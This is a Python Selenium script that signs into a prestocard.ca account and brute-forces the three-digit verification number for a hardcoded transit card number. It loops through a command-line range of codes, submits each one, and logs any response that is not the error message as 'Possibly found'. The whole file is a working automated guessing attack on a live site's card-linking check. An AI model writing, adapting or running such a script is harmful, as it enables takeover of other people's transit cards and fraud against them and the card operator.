#!/usr/bin/python

import signal
import time
import sys
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

err_msg = "The card number and verification number provided do not match our records. Please check your entry and try again"

logf = None
driver = None

def signal_handler(signal, frame):
    global logf
    print('You pressed Ctrl+C!')
    if logf:
        logf.close()
    if driver:
        driver.close()
    sys.exit(0)

def try_sc(sc_num):
    global logf
    global driver

    print("{0} {1:03} {0}".format('='*8, sc_num))
    logf.write("{0} {1:03} {0}\n".format('='*8, sc_num))
    logf.flush()
    for i in range(3):
       try:
           elem = driver.find_element_by_id("CardNumber")
           elem.send_keys("312401-0465-1658-002")
           elem = driver.find_element_by_id("VerificationNumber")
           elem.send_keys("{:03}".format(sc_num))
           elem = driver.find_element_by_id("buttonCTID6")
           elem.click()
           time.sleep(2)
           if err_msg in driver.page_source:
               print("Wrong!")
               logf.write("Wrong!\n")
               logf.flush()
               return
           else:
               print("Possibly found!!!!!!")
               logf.write("Possibly found!!!!!!\n")
               logf.flush()
       except BaseException as e:
           print("Exception:\n{}\n".format(str(e)))
           logf.write("Exception:\n{}\n\n".format(str(e)))
           logf.flush()

logf = open('scan_fast.result', 'a')
signal.signal(signal.SIGINT, signal_handler)

step = 1
try:
    driver = webdriver.Firefox()
    step += 1
    driver.implicitly_wait(10)
    step += 1
    driver.get("https://www.prestocard.ca/en")
    step += 1
    elem = driver.find_element_by_link_text("Sign In")
    step += 1
    elem.click()
    step += 1
    elem = driver.find_element_by_name("Username*")
    step += 1
    elem.send_keys("********") #Replace asteriks with actual username
    step += 1
    elem = driver.find_element_by_name("Password*")
    step += 1
    elem.send_keys("*****") #Replace asteriks with actual password
    step += 1
    elem = driver.find_element_by_id("btnsubmit")
    step += 1
    elem.click()
    step += 1
    elem = driver.find_element_by_link_text("GET STARTED")
    step += 1
    elem.click()
    step += 1
    time.sleep(1)
    elem = driver.find_element_by_id("buttonCTID7")
    step += 1
    elem.click()
    step += 1
    time.sleep(2)
    elem = driver.find_element_by_link_text("Add An Existing Card")
    step += 1
    elem.click()
    step += 1
    time.sleep(2)
except BaseException as e:
    print("Exception at step {}:\n{}\n".format(step, str(e)))
    logf.write("Exception at step {}:\n{}\n\n".format(step, str(e)))
    logf.flush()
    sys.exit(1)

for i in range(int(sys.argv[1]), int(sys.argv[2])):
    try_sc(i)
    driver.refresh()
    time.sleep(1)
    try_sc(i)
    driver.refresh()
    time.sleep(1)

if driver:
    driver.close()
if logf:
    logf.close()
       

